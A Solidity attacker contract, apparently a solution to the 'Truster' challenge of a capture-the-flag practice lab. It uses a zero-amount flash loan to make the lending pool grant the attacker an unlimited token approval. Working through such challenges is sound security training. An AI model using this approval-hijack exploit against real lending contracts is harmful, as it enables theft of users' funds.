// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./TrusterLenderPool.sol";
import "./DamnValuableToken.sol";

contract TrusterAttacker {
    function attack(address pool, address token, address attacker) external {
        // Build approve calldata to give attacker full access
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            type(uint256).max
        );

        // Call flashLoan with zero amount, but execute approve
        TrusterLenderPool(pool).flashLoan(
            0,
            attacker,
            token,
            data
        );
    }
}
